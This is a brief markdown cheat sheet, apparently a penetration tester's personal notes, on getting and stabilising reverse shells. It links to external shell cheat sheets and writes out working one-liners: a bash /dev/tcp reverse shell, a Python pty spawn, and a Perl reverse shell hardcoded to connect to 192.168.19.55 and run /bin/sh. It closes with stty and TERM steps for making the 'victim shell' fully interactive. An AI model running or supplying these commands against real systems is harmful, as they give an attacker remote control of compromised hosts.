# TTY shell cheatsheat
* https://netsec.ws/?p=337 TTY shell cheatsheat

# reverse shell cheatsheat (1 liners and shit)
* http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 

# Quick Bash Script for things like RCE,Command Injection 
`bash -i >& /dev/tcp/\<ip>/\<port> 0>&1`

# Some other shell shit
https://bananamafia.dev/post/shell-upgrade/

# Python upgrade shell
* `python -c 'import pty; pty.spawn("/bin/sh")'`

# Perl One Liner (just in case)
* `perl -e 'use Socket;$i="192.168.19.55";$p=22;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`


# Other important commands

once you upgrade to python upgraded shell:

* ctrl+z
* stty raw -echo
* fg
* enter (x2) 
	* shell now has tab-completion
* echo $TERM
* in victim shell: export TERM=\<outputfromlastcommand\>
	* Shell now can use clear
* export SHELL=bash
	* Shell now has history
